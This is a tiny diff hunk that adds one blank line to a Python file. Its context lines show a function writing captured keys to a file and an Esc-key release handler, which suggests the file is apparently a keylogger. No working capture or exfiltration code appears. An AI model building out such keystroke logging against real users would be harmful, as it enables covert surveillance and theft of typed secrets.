@@ -39,6 +39,7 @@ def write_file(keys):
             elif k.find("Key"):
                 f.write(k)
 
+
 def on_release(key):
     global exit
     if key == Key.esc:
